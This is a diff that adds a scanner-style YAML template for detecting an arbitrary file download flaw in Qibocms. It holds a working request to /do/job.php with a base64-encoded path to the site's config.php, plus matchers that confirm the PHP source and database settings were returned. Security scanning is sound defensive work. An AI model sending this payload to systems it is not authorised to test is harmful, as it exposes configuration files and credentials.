@@ -1,0 +1,29 @@
+id: qibocms-file-download
+brief:
+    title: Qibocms - Arbitrary File Download
+    by: theabhinavgaur
+    level: high
+    about: Qibocms is vulnerable to arbitrary file download vulnerability.
+    label:
+        - qibocms
+        - lfr
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8'
+      signs:
+        - "on": word
+          has:
+            - <?php
+            - $webdb
+          in: body
+          need: all
+        - "on": word
+          has:
+            - filename=config
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
